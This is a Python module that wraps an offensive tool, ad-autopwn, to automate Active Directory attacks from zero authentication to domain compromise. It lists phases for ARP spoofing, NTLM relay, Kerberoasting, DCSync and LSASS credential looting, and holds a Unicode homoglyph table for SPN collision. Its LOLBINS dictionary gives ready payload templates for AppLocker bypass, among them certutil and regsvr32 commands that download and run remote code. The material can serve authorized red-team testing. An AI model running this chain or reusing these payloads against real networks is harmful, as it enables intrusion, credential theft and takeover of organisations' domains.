"""AD AutoPwn: automated zero-auth to domain compromise attack chain.

Orchestrates 24+ AD attack techniques including:
  - Zero-auth ARP spoof, WPAD/LLMNR poisoning, WSUS relay
  - NTLM relay (CVE-2025-33073), multi-method coercion
  - Kerberoasting, AS-REP roasting, hash cracking
  - AD CS ESC1-17 enumeration and ESC1-16 exploitation
  - SCCM NAA credential theft, PXE boot credential theft
  - Shadow Credentials, RBCD abuse, WebDAV/DHCP coercion
  - GPO abuse, DCSync, DPAPI key extraction
  - BloodHound collection + automated high-value analysis
  - Auth-reflection bypass (CVE-2025-58726, CVE-2026-24294, CVE-2026-26128)
  - gMSA password read, NetNTLMv1 downgrade, LOLBin AppLocker bypass
  - Local SAM/LSA/LSASS loot + Pass-the-Hash reuse sweep

Source: https://github.com/jonaslejon/ad-autopwn (MIT)
Requires: impacket, ldap3, netexec/crackmapexec, responder, mitm6,
          certipy, bloodyad, sccmhunter, pyGPOAbuse, bloodhound-python
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.attack.ad_autopwn.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": [
        "arp_spoofing",
        "ntlm_relay",
        "credential_extraction",
        "remote_code_execution",
        "kerberos_tgs_requests",
        "ldap_modifications",
        "dcsync",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": [
        "T1557.001",  # ARP spoof
        "T1187",      # Forced authentication
        "T1558.003",  # Kerberoasting
        "T1558.004",  # AS-REP roasting
        "T1557.001",  # LLMNR/NBT-NS poisoning
        "T1072",      # SCCM abuse
        "T1003.006",  # DCSync
        "T1484.001",  # GPO abuse
        "T1649",      # AD CS abuse
    ],
    "source": "https://github.com/jonaslejon/ad-autopwn",
}

# Available attack phases that can be run individually
PHASES = [
    "full",           # Full automated chain
    "discover",       # Network discovery only
    "arp",            # ARP spoof + NTLM capture
    "wpad",           # WPAD/LLMNR poisoning
    "wsus",           # WSUS relay
    "relay",          # NTLM relay
    "coerce",         # Authentication coercion
    "roast",          # Kerberoast + AS-REP roast
    "adcs",           # AD CS enumeration + exploitation
    "sccm",           # SCCM NAA credential theft
    "shadow-creds",   # Shadow Credentials attack
    "rbcd",           # Resource-Based Constrained Delegation
    "webdav",         # WebDAV coercion
    "dhcp",           # DHCP server coercion
    "gpo",            # GPO abuse
    "dcsync",         # DCSync + DPAPI extraction
    "bloodhound",     # BloodHound collection + analysis
    "loot",           # SAM/LSA/LSASS + KeePass + PtH sweep
    "reflect",        # Auth-reflection bypass (Synacktiv 2026)
    "gmsa",           # gMSA managed password read
    "ntlmv1",         # NetNTLMv1 downgrade
    "dollar-ticket",  # Dollar ticket (machine account TGT forging)
    "tgs-rewrite",    # TGS SPN rewrite for KCD bypass
]

# Unicode homoglyphs for Kerberos SPN collision (CVE-2025-58726)
UNICODE_HOMOGLYPHS = {
    "R": "\u24c7", ".": "\u2024",
    "A": "\u0410", "B": "\u0412", "C": "\u0421", "E": "\u0415",
    "H": "\u041d", "I": "\u0406", "K": "\u041a", "M": "\u041c",
    "O": "\u041e", "P": "\u0420", "T": "\u0422", "X": "\u0425",
    "a": "\u0430", "c": "\u0441", "e": "\u0435", "i": "\u0456",
    "o": "\u043e", "p": "\u0440", "x": "\u0445", "y": "\u0443",
}

# LOLBins for AppLocker bypass
LOLBINS = {
    "mshta": 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{cmd}"", 0:close")',
    "certutil": "cmd /c certutil -urlcache -split -f {url} C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe",
    "msbuild": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\payload.csproj",
    "regsvr32": "regsvr32 /s /n /u /i:{url} scrobj.dll",
    "rundll32": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("{cmd}")',
    "wmic": 'wmic os get /format:"{url}"',
    "cmstp": "cmstp.exe /ni /s C:\\Windows\\Tasks\\payload.inf",
}


def _find_ad_autopwn() -> str | None:
    """Locate the ad-autopwn.py script."""
    path = shutil.which("ad-autopwn") or shutil.which("ad-autopwn.py")
    if path:
        return path
    search_dirs = [
        "/opt/tools/ad-autopwn",
        os.path.expanduser("~/tools/ad-autopwn"),
        "/opt/ad-autopwn",
    ]
    for d in search_dirs:
        candidate = os.path.join(d, "ad-autopwn.py")
        if os.path.isfile(candidate):
            return candidate
    return None


def _build_cmd(args: Any) -> list[str]:
    """Build command line arguments for ad-autopwn.py."""
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)

    script = _find_ad_autopwn()
    if not script:
        return []

    cmd = [sys.executable, script]

    phase = getattr(args, "phase", "full")
    if phase and phase != "full":
        cmd.extend(["--phase", phase])

    if cred.username:
        cmd.extend(["-u", cred.username])
    if cred.password:
        cmd.extend(["-p", cred.password])
    if cred.domain:
        cmd.extend(["-d", cred.domain])
    if getattr(cred, "nt_hash", None):
        cmd.extend(["-H", cred.nt_hash])

    dc_ip = getattr(args, "dc_ip", None) or getattr(args, "target", None)
    if dc_ip:
        cmd.extend(["--dc-ip", dc_ip])

    iface = getattr(args, "iface", None)
    if iface:
        cmd.extend(["-I", iface])

    target_net = getattr(args, "target_net", None)
    if target_net:
        cmd.extend(["-n", target_net])

    if getattr(args, "dry_run", False):
        cmd.append("--dry-run")

    if getattr(args, "batch", False):
        cmd.append("--batch")

    if getattr(args, "no_arp", False):
        cmd.append("--no-arp")

    if getattr(args, "no_adcs", False):
        cmd.append("--no-adcs")

    if getattr(args, "no_sccm", False):
        cmd.append("--no-sccm")

    if getattr(args, "no_bloodhound", False):
        cmd.append("--no-bloodhound")

    if getattr(args, "no_dcsync", False):
        cmd.append("--no-dcsync")

    return cmd


def run(args: Any) -> int:
    """Run ad-autopwn automated AD attack chain.

    Args:
        args.phase: Attack phase to run (default: full). See PHASES list.
        args.target / args.dc_ip: Domain controller IP.
        args.iface: Network interface for ARP/poisoning phases.
        args.target_net: Target subnet (CIDR).
        args.dry_run: Print commands without executing.
        args.batch: Non-interactive batch mode.
        args.no_arp: Skip ARP spoofing phase.
        args.no_adcs: Skip AD CS phases.
        args.no_sccm: Skip SCCM phases.
        args.no_bloodhound: Skip BloodHound collection.
        args.no_dcsync: Skip DCSync phase.
    """
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    phase = getattr(args, "phase", "full")

    print("[*] AD AutoPwn: Automated Attack Chain")
    print(f"[*] Phase: {phase}")
    print(f"[*] Domain: {cred.domain}")

    cmd = _build_cmd(args)
    if cmd:
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, text=True)
        return result.returncode

    print("[!] ad-autopwn.py not found")
    print("[*] Install: git clone https://github.com/jonaslejon/ad-autopwn /opt/tools/ad-autopwn")
    print("[*] Deps: pip install impacket ldap3")
    print()
    print("[*] Available phases:")
    for p in PHASES:
        print(f"    {p}")
    print()
    print("[*] Attack chain overview (zero-auth to DA):")
    print("  Phase 1: Network discovery (DC, gateway, WSUS, interfaces)")
    print("  Phase 2: ARP spoof NTLM capture (zero-auth)")
    print("  Phase 3: WPAD/LLMNR poisoning (IPv6 DNS hijack via mitm6)")
    print("  Phase 4: WSUS relay (intercept Windows Update NTLM)")
    print("  Phase 5: NTLM relay via impacket (CVE-2025-33073)")
    print("  Phase 6: Multi-coercion: PetitPotam, DFSCoerce, PrinterBug, ShadowCoerce")
    print("  Phase 7: Kerberoasting + AS-REP roasting + hash cracking")
    print("  Phase 8: AD CS ESC1-17 enum via Certihound, ESC1-16 exploit")
    print("  Phase 9: SCCM NAA credential theft via sccmhunter")
    print("  Phase 10: Shadow Credentials (msDS-KeyCredentialLink + PKINIT)")
    print("  Phase 11: RBCD abuse (S4U2Proxy impersonation)")
    print("  Phase 12: WebDAV coercion (WebClient HTTP to LDAP relay bypass)")
    print("  Phase 13: DHCP coercion (DHCP server machine account relay)")
    print("  Phase 14: GPO abuse (pyGPOAbuse scheduled task as SYSTEM)")
    print("  Phase 15: Auth-reflection (CVE-2025-58726, CVE-2026-24294, CVE-2026-26128)")
    print("  Phase 16: gMSA managed-password read")
    print("  Phase 17: NetNTLMv1 downgrade, dollar ticket, TGS rewrite")
    print("  Phase 18: DCSync + DPAPI backup key extraction")
    print("  Phase 19: BloodHound -c All + automated high-value analysis")
    print("  Phase 20: Local SAM/LSA/LSASS loot + PtH sweep")
    return 1
